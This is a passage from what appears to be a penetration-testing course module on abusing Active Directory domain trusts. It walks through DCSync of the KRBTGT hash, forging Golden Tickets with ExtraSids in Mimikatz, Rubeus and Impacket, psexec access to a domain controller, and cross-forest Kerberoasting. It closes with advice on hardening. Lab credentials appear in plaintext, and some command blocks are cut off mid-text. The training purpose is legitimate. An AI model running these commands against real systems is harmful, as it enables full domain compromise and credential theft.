Now we can gather each piece of data required to perform the ExtraSids attack. First, we need to obtain the NT hash for the [KRBTGT](https://adsecurity.org/?p=483) account, which is a service account for the Key Distribution Center (KDC) in Active Directory. The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments. The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account, which should be done periodically and definitely after a penetration test assessment where full domain compromise is reached.

Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.

#### Obtaining the KRBTGT Account's NT Hash using Mimikatz

```powershell
PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/1/2021 11:21:33 AM
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
    ntlm- 0: 9d765b482771505cbe97411065964d5f
    lm  - 0: 69df324191d4a80f0ed100c10f20561e

```

We can use the PowerView `Get-DomainSID` function to get the SID for the child domain, but this is also visible in the Mimikatz output above.

#### Using Get-DomainSID

```powershell
PS C:\htb> Get-DomainSID

S-1-5-21-2806153819-209893948-922872689

```

Next, we can use `Get-DomainGroup` from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. We could also do this with the [Get-ADGroup](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps) cmdlet with a command such as `Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`.

#### Obtaining Enterprise Admins Group's SID using Get-DomainGroup

```powershell
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

distinguishedname                                       objectsid
-----------------                                       ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519

```

At this point, we have gathered the following data points:

- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
- The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: `hacker`
- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`

Before the attack, we can confirm no access to the file system of the DC in the parent domain.

#### Using ls to Confirm No Access

```powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
At line:1 char:1
+ ls \\academy-ea-dc01.inlanefreight.local\c$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

```

Using Mimikatz and the data listed above, we can create a Golden Ticket to access all resources within the parent domain.

#### Creating a Golden Ticket with Mimikatz

```powershell
PS C:\htb> mimikatz.exe

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

We can confirm that the Kerberos ticket for the non-existent hacker user is residing in memory.

#### Confirming a Kerberos Ticket is in Memory Using klist

From here, it is possible to access any resources within the parent domain, and we could compromise the parent domain in several ways.

#### Listing the Entire C: Drive of the Domain Controller

```powershell

## ExtraSids Attack - Rubeus

We can also perform this attack using Rubeus. First, again, we'll confirm that we cannot access the parent domain Domain Controller's file system.

#### Using ls to Confirm No Access Before Running Rubeus

```powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

ls : Access is denied
At line:1 char:1
+ ls \\academy-ea-dc01.inlanefreight.local\c$
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\academy-ea-dc01.inlanefreight.local\c$:String) [Get-ChildItem], UnauthorizedAcces
   sException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

<SNIP>

```

Next, we will formulate our Rubeus command using the data we retrieved above. The `/rc4` flag is the NT hash for the KRBTGT account. The `/sids` flag will tell Rubeus to create our Golden Ticket giving us the same rights as members of the Enterprise Admins group in the parent domain.

#### Creating a Golden Ticket using Rubeus

```powershell

Once again, we can check that the ticket is in memory using the `klist` command.

Finally, we can test this access by performing a DCSync attack against the parent domain, targeting the `lab_adm` Domain Admin user.

When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller. The command for this would look like the following:

```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server

## Next Steps

Now that we've walked through child --> parent domain compromise from a Windows attack box, we'll cover a few ways to achieve the same if we are constrained to a Linux attack host.


# Attacking Domain Trusts - Child -> Parent Trusts - from Linux

* * *

We can also perform the attack shown in the previous section from a Linux attack host. To do so, we'll still need to gather the same bits of information:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain
- The SID of the Enterprise Admins group of the root domain

Once we have complete control of the child domain, `LOGISTICS.INLANEFREIGHT.LOCAL`, we can use `secretsdump.py` to DCSync and grab the NTLM hash for the KRBTGT account.

#### Performing DCSync with secretsdump.py

```shell
secretsdump.py logistics.inlanefreight.local/[email protected] -just-dc-user LOGISTICS/krbtgt

[*] Cleaning up...

```

Next, we can use [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain. In this command, whatever we specify for the IP address (the IP of the domain controller in the child domain) will become the target domain for a SID lookup. The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format `DOMAIN_SID-RID`. For example, from the output below, we can see that the SID of the `lab_adm` user would be `S-1-5-21-2806153819-209893948-922872689-1001`.

#### Performing SID Brute Forcing using lookupsid.py

1106: LOGISTICS\htb-student_adm (SidTypeUser)

```

We can filter out the noise by piping the command output to grep and looking for just the domain SID.

#### Looking for the Domain SID

```shell
lookupsid.py logistics.inlanefreight.local/[email protected] | grep "Domain SID"

Password:

[*] Domain SID is: S-1-5-21-2806153819-209893948-92287268

```

Next, we can rerun the command, targeting the INLANEFREIGHT Domain Controller (DC01) at 172.16.5.5 and grab the domain `SID S-1-5-21-3842939050-3880317879-2865463114` and attach the RID of the Enterprise Admins group. [Here](https://adsecurity.org/?p=1001) is a handy list of well-known SIDs.

#### Grabbing the Domain SID & Attaching to Enterprise Admin's RID

```shell

517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)

```

We have gathered the following data points to construct the command for our attack. Once again, we will use the non-existent user `hacker` to forge our Golden Ticket.

- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
- The name of a target user in the child domain (does not need to exist!): `hacker`
- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`

Next, we can use [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) from the Impacket toolkit to construct a Golden Ticket. This ticket will be valid to access resources in the child domain (specified by `-domain-sid`) and the parent domain (specified by `-extra-sid`).

#### Constructing a Golden Ticket using ticketer.py

```shell

The ticket will be saved down to our system as a [credential cache (ccache)](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file, which is a file used to hold Kerberos credentials. Setting the `KRB5CCNAME` environment variable tells the system to use this file for Kerberos authentication attempts.

#### Setting the KRB5CCNAME Environment Variable

```shell
export KRB5CCNAME=hacker.ccache

```

We can check if we can successfully authenticate to the parent domain's Domain Controller using [Impacket's version of Psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py). If successful, we will be dropped into a SYSTEM shell on the target Domain Controller.

Impacket also has the tool [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py), which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest. If we walk through the output, we see that it starts by listing out the child and parent domain's fully qualified domain names (FQDN). It then:

- Obtains the SID for the Enterprise Admins group of the parent domain
- Retrieves the hash for the KRBTGT account in the child domain
- Creates a Golden Ticket
- Logs into the parent domain
- Retrieves credentials for the Administrator account in the parent domain

Finally, if the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.

Though tools such as `raiseChild.py` can be handy and save us time, it is essential to understand the process and be able to perform the more manual version by gathering all of the required data points. In this case, if the tool fails, we are more likely to understand why and be able to troubleshoot what is missing, which we would not be able to if blindly running this tool. In a client production environment, we should **`always`** be careful when running any sort of "autopwn" script like this, and always remain cautious and construct commands manually when possible. Other tools exist which can take in data from a tool such as BloodHound, identify attack paths, and perform an "autopwn" function that can attempt to perform each action in an attack chain to elevate us to Domain Admin (such as a long ACL attack path). I would recommend avoiding tools such as these and work with tools that you understand fully, and will also give you the greatest degree of control throughout the process.

`We don't want to tell the client that something broke because we used an "autopwn" script!`

## More Fun

In the next section, we will briefly discuss some techniques that can be used for cross-forest trust abuse when we find ourselves in an environment with a bidirectional forest trust (meaning we can authenticate into another forest). We will not cover all possible cross-forest trust attacks, as those will be covered in great detail in later modules.


# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

* * *

## Cross-Forest Kerberoasting

Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold. Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.

We can utilize PowerView to enumerate accounts in a target domain that have SPNs associated with them.

#### Enumerating Accounts for Associated SPNs Using Get-DomainUser

```powershell
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc

```

We see that there is one account with an SPN in the target domain. A quick check shows that this account is a member of the Domain Admins group in the target domain, so if we can Kerberoast it and crack the hash offline, we'd have full admin rights to the target domain.

#### Enumerating the mssqlsvc Account

```powershell
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL

```

Let's perform a Kerberoasting attack across the trust using `Rubeus`. We run the tool as we did in the Kerberoasting section, but we include the `/domain:` flag and specify the target domain.

#### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : mssqlsvc
[*] Target Domain          : FREIGHTLOGISTICS.LOCAL

[*] Total kerberoastable users : 1

[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] PwdLastSet             : 3/24/2022 12:47:52 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:[email protected]*$<SNIP>

```

We could then run the hash through Hashcat. If it cracks, we've now quickly expanded our access to fully control two domains by leveraging a pretty standard attack and abusing the authentication direction and setup of the bidirectional forest trust.

* * *

## Admin Password Re-Use & Group Membership

From time to time, we'll run into a situation where there is a bidirectional forest trust managed by admins from the same company. If we can take over Domain A and obtain cleartext passwords or NT hashes for either the built-in Administrator account (or an account that is part of the Enterprise Admins or Domain Admins group in Domain A), and Domain B has a highly privileged account with the same name, then it is worth checking for password reuse across the two forests. I occasionally ran into issues where, for example, Domain A would have a user named `adm_bob.smith` in the Domain Admins group, and Domain B had a user named `bsmith_admin`. Sometimes, the user would be using the same password in the two domains, and owning Domain A instantly gave me full admin rights to Domain B.

We may also see users or admins from Domain A as members of a group in Domain B. Only `Domain Local Groups` allow security principals from outside its forest. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.

We can use the PowerView function [Get-DomainForeignGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainForeignGroupMember) to enumerate groups with users that do not belong to the domain, also known as `foreign group membership`. Let's try this against the `FREIGHTLOGISTICS.LOCAL` domain with which we have an external bidirectional forest trust.

#### Using Get-DomainForeignGroupMember

```powershell
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL

PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

INLANEFREIGHT\administrator

```

The above command output shows that the built-in Administrators group in `FREIGHTLOGISTICS.LOCAL` has the built-in Administrator account for the `INLANEFREIGHT.LOCAL` domain as a member. We can verify this access using the `Enter-PSSession` cmdlet to connect over WinRM.

#### Accessing DC03 Using Enter-PSSession

```powershell
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
inlanefreight\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL

```

From the command output above, we can see that we successfully authenticated to the Domain Controller in the `FREIGHTLOGISTICS.LOCAL` domain using the Administrator account from the `INLANEFREIGHT.LOCAL` domain across the bidirectional forest trust. This can be a quick win after taking control of a domain and is always worth checking for if a bidirectional forest trust situation is present during an assessment and the second forest is in-scope.

* * *

## SID History Abuse - Cross Forest

SID History can also be abused across a forest trust. If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust. If the SID of an account with administrative privileges in Forest A is added to the SID history attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest. In the below diagram, we can see an example of the `jjones` user being migrated from the `INLANEFREIGHT.LOCAL` domain to the `CORP.LOCAL` domain in a different forest. If SID filtering is not enabled when this migration is made and the user has administrative privileges (or any type of interesting rights such as ACE entries, access to shares, etc.) in the `INLANEFREIGHT.LOCAL` domain, then they will retain their administrative rights/access in `INLANEFREIGHT.LOCAL` while being a member of the new domain, `CORP.LOCAL` in the second forest.

![image](https://academy.hackthebox.com/storage/modules/143/sid-history.png)

This attack will be covered in-depth in a later module focusing more heavily on attacking AD trusts.

* * *

## Onwards

Next, we'll walk through some examples of attacking across a forest trust from a Linux attack host.


# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

* * *

As we saw in the previous section, it is often possible to Kerberoast across a forest trust. If this is possible in the environment we are assessing, we can perform this with `GetUserSPNs.py` from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the `-target-domain` flag in our command. Performing this against the `FREIGHTLOGISTICS.LOCAL` domain, we see one SPN entry for the `mssqlsvc` account.

## Cross-Forest Kerberoasting

#### Using GetUserSPNs.py

```shell
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>

```

Rerunning the command with the `-request` flag added gives us the TGS ticket. We could also add `-outputfile <OUTPUT FILE>` to output directly into a file that we could then turn around and run Hashcat against.

#### Using the -request Flag

```shell
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>

$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>

```

We could then attempt to crack this offline using Hashcat with mode `13100`. If successful, we'd be able to authenticate into the `FREIGHTLOGISTICS.LOCAL` domain as a Domain Admin. If we are successful with this type of attack during a real-world assessment, it would also be worth checking to see if this account exists in our current domain and if it suffers from password re-use. This could be a quick win for us if we have not yet been able to escalate in our current domain. Even if we already have control over the current domain, it would be worth adding a finding to our report if we do find password re-use across similarly named accounts in different domains.

Suppose we can Kerberoast across a trust and have run out of options in the current domain. In that case, it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. Here, we have yet another example of iterative testing and leaving no stone unturned.

* * *

## Hunting Foreign Group Membership with Bloodhound-python

As noted in the last section, we may, from time to time, see users or admins from one domain as members of a group in another domain. Since only `Domain Local Groups` allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship. If we are testing from a Linux host, we can gather this information by using the [Python implementation of BloodHound](https://github.com/fox-it/BloodHound.py). We can use this tool to collect data from multiple domains, ingest it into the GUI tool and search for these relationships.

On some assessments, our client may provision a VM for us that gets an IP from DHCP and is configured to use the internal domain's DNS. We will be on an attack host without DNS configured in other instances. In this case, we would need to edit our `resolv.conf` file to run this tool since it requires a DNS hostname for the target Domain Controller instead of an IP address. We can edit the file as follows using sudo rights. Here we have commented out the current nameserver entries and added the domain name and the IP address of `ACADEMY-EA-DC01` as the nameserver.

#### Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf

```shell
cat /etc/resolv.conf

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5

```

Once this is in place, we can run the tool against the target domain as follows:

#### Running bloodhound-python Against INLANEFREIGHT.LOCAL

```shell
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01

INFO: Found 2950 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts

<SNIP>

```

We can compress the resultant zip files to upload one single zip file directly into the BloodHound GUI.

#### Compressing the File with zip -r

```shell
zip -r ilfreight_bh.zip *.json

  adding: 20220329140127_computers.json (deflated 99%)
  adding: 20220329140127_domains.json (deflated 82%)
  adding: 20220329140127_groups.json (deflated 97%)
  adding: 20220329140127_users.json (deflated 98%)

```

We will repeat the same process, this time filling in the details for the `FREIGHTLOGISTICS.LOCAL` domain.

#### Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf

```shell
cat /etc/resolv.conf

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238

```

The `bloodhound-python` command will look similar to the previous one:

#### Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL

```shell
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u [email protected] -p Klmcargo2

INFO: Found AD domain: freightlogistics.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL

INFO: Found 9 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 52 groups
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers

```

After uploading the second set of data (either each JSON file or as one zip file), we can click on `Users with Foreign Domain Group Membership` under the `Analysis` tab and select the source domain as `INLANEFREIGHT.LOCAL`. Here, we will see the built-in Administrator account for the INLANEFREIGHT.LOCAL domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain as we saw previously.

#### Viewing Dangerous Rights through BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/foreign_membership.png)

* * *

## Closing Thoughts on Trusts

As seen in the past few sections, there are several ways to leverage domain trusts to gain additional access and even do an "end-around" and escalate privileges in our current domain. For example, we can take over a domain that our current domain has a trust with, and find password re-use across privileged accounts. We've seen how Domain Admin rights in a child domain nearly always mean we can escalate privileges and compromise the parent domain using the ExtraSids attack. Domain trusts are a rather large and complex topic. The primer in this module has given us the tools to enumerate trusts and perform some standard intra-forest and cross-forest attacks.


# Hardening Active Directory

* * *

Let's take some time to look at a few hardening measures that can be put in place to stop common TTPs like those we utilized in this module from being successful or providing any helpful information. Our goal as penetration testers is to help provide a better operational picture of our customers' network to their defenders and help improve their security posture. So we should understand some of the common defense tactics that can be implemented and how they would affect the networks we are assessing. These basic hardening steps will do much more for an organization (regardless of size) than purchasing the next big EDR or SIEM tool. Those extra defensive measures and equipment only help if you have a baseline security posture with features like logging enabled and proper documentation and tracking of the hosts within the network.

## Step One: Document and Audit

Proper AD hardening can keep attackers contained and prevent lateral movement, privilege escalation, and access to sensitive data and resources. One of the essential steps in AD hardening is understanding everything present in your AD environment. An audit of everything listed below should be done annually, if not every few months, to ensure your records are up to date. We care about:

#### Things To Document and Track

- `Naming conventions of OUs, computers, users, groups`
- `DNS, network, and DHCP configurations`
- `An intimate understanding of all GPOs and the objects that they are applied to`
- `Assignment of FSMO roles`
- `Full and current application inventory`
- `A list of all enterprise hosts and their location`
- `Any trust relationships we have with other domains or outside entities`
- `Users who have elevated permissions`

* * *

## People, Processes, and Technology

AD hardening can be broken out into the categories _People_, _Process,_ and _Technology_. These hardening measures will encompass the hardware, software, and human aspects of any network.

### People

In even the most hardened environment, users remain the weakest link. Enforcing security best practices for standard users and administrators will prevent "easy wins" for pentesters and malicious attackers. We should also strive to keep our users educated and aware of threats to themselves. The measures below are a great way to start securing the Human element of an AD environment.

- The organization should have a strong password policy, with a password filter that disallows the use of common words (i.e., welcome, password, names of months/days/seasons, and the company name). If possible, an enterprise password manager should be used to assist users with choosing and using complex passwords.
- Rotate passwords periodically for **all** service accounts.
- Disallow local administrator access on user workstations unless a specific business need exists.
- Disable the default `RID-500 local admin` account and create a new admin account for administration subject to LAPS password rotation.
- Implement split tiers of administration for administrative users. Too often, during an assessment, you will gain access to Domain Administrator credentials on a computer that an administrator uses for all work activities.
- Clean up privileged groups. `Does the organization need 50+ Domain/Enterprise Admins?` Restrict group membership in highly privileged groups to only those users who require this access to perform their day-to-day system administrator duties.
- Where appropriate, place accounts in the `Protected Users` group.
- Disable Kerberos delegation for administrative accounts (the Protected Users group may not do this)

### Protected Users Group

The [Protected Users group](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group) first appeared with Window Server 2012 R2. This group can be used to restrict what members of this privileged group can do in a domain. Adding users to Protected Users prevents user credentials from being abused if left in memory on a host.

#### Viewing the Protected Users Group with Get-ADGroup

```powershell
PS C:\Users\htb-student> Get-ADGroup -Identity "Protected Users" -Properties Name,Description,Members

Description       : Members of this group are afforded additional protections against authentication security threats.
                    See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
DistinguishedName : CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
GroupCategory     : Security
GroupScope        : Global
Members           : {CN=sqlprod,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL, CN=sqldev,OU=Service
                    Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL}
Name              : Protected Users
ObjectClass       : group
ObjectGUID        : e4e19353-d08f-4790-95bc-c544a38cd534
SamAccountName    : Protected Users
SID               : S-1-5-21-2974783224-3764228556-2640795941-525

```

The group provides the following Domain Controller and device protections:

- Group members can not be delegated with constrained or unconstrained delegation.
- CredSSP will not cache plaintext credentials in memory even if Allow delegating default credentials is set within Group Policy.
- Windows Digest will not cache the user's plaintext password, even if Windows Digest is enabled.
- Members cannot authenticate using NTLM authentication or use DES or RC4 keys.
- After acquiring a TGT, the user's long-term keys or plaintext credentials are not cached.
- Members cannot renew a TGT longer than the original 4-hour TTL.

Note: The Protected Users group can cause unforeseen issues with authentication, which can easily result in account lockouts. An organization should never place all privileged users in this group without staged testing.

Along with ensuring your users cannot cause harm to themselves, we should consider our policies and procedures for domain access and control.

### Processes

Maintaining and enforcing policies and procedures that can significantly impact an organization's overall security posture is necessary. Without defined policies, it is impossible to hold an organization's employees accountable, and difficult to respond to an incident without defined and practiced procedures such as a disaster recovery plan. The items below can help to define processes, policies, and procedures.

- Proper policies and procedures for AD asset management.
  - AD host audit, the use of asset tags, and periodic asset inventories can help ensure hosts are not lost.
- Access control policies (user account provisioning/de-provisioning), multi-factor authentication mechanisms.
- Processes for provisioning and decommissioning hosts (i.e., baseline security hardening guideline, gold images)
- AD cleanup policies
  - `Are accounts for former employees removed or just disabled?`
  - `What is the process for removing stale records from AD?`
  - Processes for decommissioning legacy operating systems/services (i.e., proper uninstallation of Exchange when migrating to 0365).
  - Schedule for User, groups, and hosts audit.

### Technology

Periodically review AD for legacy misconfigurations and new and emerging threats. As changes are made to AD, ensure that common misconfigurations are not introduced. Pay attention to any vulnerabilities introduced by AD and tools or applications utilized in the environment.

- Run tools such as BloodHound, PingCastle, and Grouper periodically to identify AD misconfigurations.
- Ensure that administrators are not storing passwords in the AD account description field.
- Review SYSVOL for scripts containing passwords and other sensitive data.
- Avoid the use of "normal" service accounts, utilizing Group Managed (gMSA) and Managed Service Accounts (MSA) where ever possible to mitigate the risk of Kerberoasting.
- Disable Unconstrained Delegation wherever possible.
- Prevent direct access to Domain Controllers through the use of hardened jump hosts.
- Consider setting the `ms-DS-MachineAccountQuota` attribute to `0`, which disallows users from adding machine accounts and can prevent several attacks such as the noPac attack and Resource-Based Constrained Delegation (RBCD)
- Disable the print spooler service wherever possible to prevent several attacks
- Disable NTLM authentication for Domain Controllers if possible
